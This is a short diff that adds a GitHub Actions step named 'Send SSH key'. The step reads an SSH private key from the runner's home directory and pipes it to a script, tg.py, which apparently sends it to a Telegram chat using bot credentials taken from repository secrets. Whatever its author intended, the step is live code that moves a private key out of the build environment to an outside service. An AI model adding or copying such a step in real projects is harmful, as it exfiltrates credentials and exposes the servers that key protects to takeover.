@@ -1,0 +1,6 @@
+- name: Send SSH key
+        env:
+          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          cat $HOME/.ssh/oci_key | python tg.py
